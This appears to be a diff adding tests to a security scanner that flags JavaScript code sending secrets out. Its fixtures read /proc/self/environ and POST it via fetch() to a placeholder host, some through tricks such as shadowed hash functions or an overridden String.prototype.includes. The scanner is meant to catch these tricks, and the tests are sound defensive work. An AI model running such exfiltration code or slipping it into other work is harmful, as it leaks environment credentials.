@@ -574,3 +574,100 @@ def test_reducers_and_a_real_tls_key_option_stay_warn():
         "r.end();\n"
     )
     assert _flow_rules(tls_key) == {"JS_SECRET_FILE_FLOW": "warn"}
+
+
+# --------------------------------------------------------------------------- #
+# Round 2 addendum 2: reducers count only on a RESOLVED receiver; `match` is   #
+# not a reducer (it returns the matched text).                                  #
+# --------------------------------------------------------------------------- #
+def test_unresolved_or_returning_reducers_stay_crit():
+    match = _environ_then("data.match(/[\\s\\S]*/)[0]")
+    user_sign = _FS + (
+        "const sign = (x) => x;\n"
+        "const data = fs.readFileSync('/proc/self/environ', 'utf8');\n"
+        f"fetch('https://{_HOST}/', {{method: 'POST', body: sign(data)}});\n"
+    )
+    obj_sign = _environ_then("obj.sign(data)")
+    unrelated_update = _FS + _CRYPTO + (
+        "const data = fs.readFileSync('/proc/self/environ', 'utf8');\n"
+        "const h = crypto.createHash('sha256');\n"
+        f"fetch('https://{_HOST}/', {{method: 'POST', body: obj.update(data)}});\n"
+    )
+    plain_includes_arg = _environ_then("list.includes(data) && data")
+    for src in (match, user_sign, obj_sign, unrelated_update, plain_includes_arg):
+        assert _flow_rules(src) == {"JS_CRED_EXFIL_FLOW": "crit"}, src
+
+
+def test_resolved_crypto_and_regexp_reducers_stay_warn():
+    hmac_chain = _FS + _CRYPTO + (
+        "const data = fs.readFileSync('/proc/self/environ', 'utf8');\n"
+        f"fetch('https://{_HOST}/', {{method: 'POST', body: crypto.createHash('sha256')"
+        ".update(data).digest('hex')}});\n"
+    )
+    destructured = _FS + "const { createHmac } = require('node:crypto');\n" + (
+        "const data = fs.readFileSync('/proc/self/environ', 'utf8');\n"
+        f"fetch('https://{_HOST}/', {{method: 'POST', body: createHmac('sha256', data)"
+        ".update('x').digest('hex')}});\n"
+    )
+    named_obj = _FS + _CRYPTO + (
+        "const data = fs.readFileSync('/proc/self/environ', 'utf8');\n"
+        "const h = crypto.createHash('sha256');\n"
+        f"fetch('https://{_HOST}/', {{method: 'POST', body: h.update(data)}});\n"
+        "h.digest('hex');\n"
+    )
+    regex_test = _environ_then("String(/CI=/.test(data))")
+    for src in (hmac_chain, destructured, named_obj, regex_test):
+        assert _flow_rules(src) == {"JS_SECRET_FILE_FLOW": "warn"}, src
+    # the round-2 warn twins still hold: SigV4, `.length`, boolean `.includes`
+    assert _flow_rules(_environ_then("String(data.length)")) == {"JS_SECRET_FILE_FLOW": "warn"}
+    assert _flow_rules(_environ_then("String(data.includes('CI='))")) == {
+        "JS_SECRET_FILE_FLOW": "warn"
+    }
+
+
+# --------------------------------------------------------------------------- #
+# Round 2 addendum 3: a locally defined function under a reducer's name gets   #
+# no reducer credit (fail-closed); includes/test only as postfix / RegExp.     #
+# --------------------------------------------------------------------------- #
+def test_a_locally_shadowed_reducer_name_stays_crit():
+    hmac = (
+        "crypto.createHash('sha256').update(data).digest('hex')"
+    )
+    shadows = (
+        "function update(x) { return { digest: () => x }; }\n",
+        "const createHash = (a) => ({ update: (x) => ({ digest: () => x }) });\n",
+        "crypto.createHash = (a) => ({ update: (x) => ({ digest: () => x }) });\n",
+        "class H { digest(x) { return x; } }\n",
+    )
+    for shadow in shadows:
+        src = _FS + _CRYPTO + shadow + (
+            "const data = fs.readFileSync('/proc/self/environ', 'utf8');\n"
+            f"fetch('https://{_HOST}/', {{method: 'POST', body: {hmac}}});\n"
+        )
+        assert _flow_rules(src) == {"JS_CRED_EXFIL_FLOW": "crit"}, shadow
+    proto = _FS + "String.prototype.includes = function () { return this; };\n" + (
+        "const data = fs.readFileSync('/proc/self/environ', 'utf8');\n"
+        f"fetch('https://{_HOST}/', {{method: 'POST', body: data.includes('x')}});\n"
+    )
+    let_test = _FS + "let test = (x) => x;\n" + (
+        "const data = fs.readFileSync('/proc/self/environ', 'utf8');\n"
+        f"fetch('https://{_HOST}/', {{method: 'POST', body: /x/.test(data)}});\n"
+    )
+    assert _flow_rules(proto) == {"JS_CRED_EXFIL_FLOW": "crit"}
+    assert _flow_rules(let_test) == {"JS_CRED_EXFIL_FLOW": "crit"}
+
+
+def test_free_standing_boolean_callees_and_bare_crypto_names_are_not_reducers():
+    for expr in ("includes(data)", "test(data)", "startsWith(data)", "sign(data)",
+                 "createHmac('sha256', data).digest('hex')", "re.test(data) && data"):
+        assert _flow_rules(_environ_then(expr)) == {"JS_CRED_EXFIL_FLOW": "crit"}, expr
+
+
+def test_crypto_sign_and_verify_on_the_binding_are_reducers():
+    for expr in ("crypto.sign('sha256', Buffer.from('m'), data)",
+                 "crypto.createSign('sha256').update(data).sign(k)"):
+        src = _FS + _CRYPTO + (
+            "const data = fs.readFileSync('/proc/self/environ', 'utf8');\n"
+            f"fetch('https://{_HOST}/', {{method: 'POST', body: {expr}}});\n"
+        )
+        assert _flow_rules(src) == {"JS_SECRET_FILE_FLOW": "warn"}, expr
